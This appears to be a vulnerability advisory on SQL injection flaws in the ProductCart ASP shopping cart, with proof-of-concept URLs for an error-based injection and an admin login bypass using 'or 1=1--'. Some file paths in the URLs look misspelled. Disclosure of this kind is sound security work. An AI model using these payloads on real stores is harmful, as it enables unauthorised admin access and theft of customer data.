Overview:
From the web
"ProductCartÂ® is an ASP shopping cart that combines sophisticated ecommerce 
features with time-saving store management tools and remarkable ease of use."
From the author
"Even the application is not Open Source, but we can 'debug' the application
on the fly. And with SQL Injection we can query some information about the 
tables
and database, even the data it self. With more work will couse ability to 
access into 
the admin control panel site."



Details:
The error msg of the application handled very good, but not that good. Couse 
still have
XSS injection vulnerbility (read my previous advisories). Those error handler 
would make
exploitation very difficult to do.
But, not all script handled by those error handler script. 
For example Custva.asp, its still vulnerable to SQL Injection. 

But the worst is, on the admin control panel which is can be injected by old 
famous 
SQL injection 'or 1=1--'. Which makes you able to get access into admin 
control panel
without needing any access.



Exploits/POC:
file Custva.asp
http://<target>/productcart/pc/Custvb.asp?redirectUrl=&Email=%27+having+1%3D1--
&_email=email
&password=asd&_password=required&Submit.x=33&Submit.y=5&Submit=Submit

file login.asp
http://<target>/produccart/pdacmin/login.asp?idadmin='' or 1=1--



Vendor Response:
Contacted. No response yet.



Recommendation:
No recommendation for this.
